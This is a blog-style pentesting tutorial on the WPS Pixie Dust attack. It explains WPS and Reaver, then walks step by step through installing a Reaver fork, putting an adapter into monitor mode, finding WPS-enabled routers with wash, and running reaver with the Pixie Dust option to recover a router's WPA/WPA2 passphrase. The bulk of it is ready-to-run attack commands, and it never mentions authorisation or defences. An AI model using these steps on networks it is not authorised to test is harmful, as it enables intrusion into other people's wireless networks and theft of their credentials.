---
title: WPS Pixie Dust Attack
categories: [Wireless Pentesting]
tags: [wifi, wps, reaver, airmon-ng]
image: assets/img/WPS%20Pixie%20Dust%20Attack/Pasted%20image%2020230612203522.png
---

## What is WPS?

**Wifi Protected Setup** (WPS) is an optional certification program from the Wi-Fi Alliance that is designed to ease the task of setting up and configuring security on wireless local area networks. Wi-Fi Protected Setup enables typical users who possess little understanding of traditional Wi-Fi configuration and security settings to automatically configure new wireless networks, add new devices and enable security.

## Now what is a Pixie Dust Attack?

A **Pixie-Dust** **attack** works by brute-forcing the key for a protocol called WPS. WPS was intended to make accessing a **router** easier, and it did – for attackers.

## Introduction to Reaver

Reaver is an open-source tool for performing brute force attack against Wifi Protected Setup (WPS) registrar PINs in order to recover WPA/WPA2 passphrases. This tool has been designed to be a robust and practical and has been tested against a wide variety of access points and WPS implementations.

The original Reaver performs a brute force attack against the AP, attempting every possible combination in order to guess the AP’s 8 digit pin number. Depending on the target’s Access Point (AP), Reaver will recover the AP’s plain text WPA / WPA2 passphrase in 4-10 hours, on average. But If you are using offline attack and the AP is vulnerable, it may take only a few seconds/minutes.

## Attack:

### Step 1 : Download All Dependencies

It’s important to download all dependencies from the repository before proceeding with the attack. Kali Linux includes some of these, but if you’re using another flavor of Linux, it may not. So let’s go through all of them.

First, type into the terminal:

```
sudo apt-get update
```

Then:

```
sudo apt-get install build-essential libpcap-dev sqlite3 libsqlite3-dev pixiewps
```

### Step 2 : Clone the GitHub

This attack works by using a fork of Reaver. We’ll need to download, compile, and install the fork. Let’s begin:

- [https://github.com/t6x/reaver-wps-fork-t6x](https://github.com/t6x/reaver-wps-fork-t6x)

```
git clone https://github.com/t6x/reaver-wps-fork-t6x
```

### Step 3 : Installation

From your current working directory, type…

```
cd reaver-wps-fork-t6x/
cd src/
./configure
make
make install
```

or `sudo make install` if you’re not logged in as root.

### Step 4 : Monitor Mode

Put your interface into monitor mode using

```
airmon-ng start {monitor-interface}
```

![](assets/img/WPS%20Pixie%20Dust%20Attack/Pasted%20image%2020230612203929.png)

### Step 5: Find a Target

The easiest way to find a target with WPS enabled is

```
wash -i {monitor-interface}
```

Gather the BSSID and channel for the router you want to attack. Make sure you have a strong signal before attempting this attack.

![](assets/img/WPS%20Pixie%20Dust%20Attack/Pasted%20image%2020230612203954.png)

### Step 6 : Launch the Attack

Once you have all the information, simply type in the following command:

```
reaver -i {monitor interface} -b {BSSID of router} -c {router channel} -vvv -K 1 -f
```

![](assets/img/WPS%20Pixie%20Dust%20Attack/Pasted%20image%2020230612204015.png)

### Step 7 : Get the Password

There’s the password! Again, this attack won’t work against all routers, but it is definitely more effective than a brute force attack (Pixie Dust: maximum 30 minutes vs Brute Force: minutes to DAYS!)

![](assets/img/WPS%20Pixie%20Dust%20Attack/Pasted%20image%2020230612204035.png)

